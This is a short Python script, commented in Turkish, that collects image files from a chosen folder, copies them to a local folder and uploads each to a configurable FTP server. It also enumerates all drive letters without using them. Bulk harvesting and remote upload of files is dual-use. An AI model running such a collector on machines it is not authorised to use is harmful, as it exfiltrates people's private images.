import os
import ftplib
import shutil

# Kaynak dizini
src_folder = 'hangi klasörde çalışmasını istiyorsanız buraya yolunu belirtin'

# Hedef dizini
dst_folder = 'toplananlar buraya kopyalanır yolunu belirtin'

# FTP bilgilerini kendinize göre değiştirin
ftp_host = ''
ftp_username = ''
ftp_password = ''
ftp_path = ''

drives = [drive + ':' for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(drive + ':')]

with ftplib.FTP(ftp_host, ftp_username, ftp_password) as ftp:
    ftp.cwd(ftp_path)
    for root, dirs, files in os.walk(src_folder):
        for file in files:
            #uzantılar değiştirilebilir
            if file.endswith(('.jpg', '.png','jpeg')):
                file_path = os.path.join(root, file)
                shutil.copy(file_path, dst_folder)
                with open(file_path, 'rb') as f:
                    ftp.storbinary('STOR ' + file, f)
                print(file_path + ' yüklendi.')
